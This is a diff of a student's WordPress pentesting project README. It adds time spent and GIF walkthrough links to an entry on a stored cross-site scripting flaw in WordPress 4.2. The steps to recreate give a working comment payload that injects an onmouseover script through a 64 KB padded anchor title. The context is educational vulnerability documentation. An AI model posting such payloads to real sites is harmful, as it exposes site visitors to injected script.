@@ -1,6 +1,6 @@
 # Project 7 - WordPress Pentesting
 
-Time spent: **X** hours spent in total
+Time spent: 7 hours spent in total
 
 > Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress
 
@@ -12,6 +12,8 @@ Time spent: **X** hours spent in total
     - Tested in version: 4.2
     - Fixed in version: 4.2.1
   - [ ] GIF Walkthrough: 
+                        https://github.com/akaycee/Codepath/blob/main/Vulnerablility1.gif
+                        https://github.com/akaycee/Codepath/blob/main/Vulnerablility1b.gif
   - [ ] Steps to recreate: 1) Post the following comment
                            <a title='x onmouseover=alert(unescape(/Youve%20been%20Pwned/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
                            replace the ...[64 kb].. with 64kb worth of data (replace with 64k 'A's)
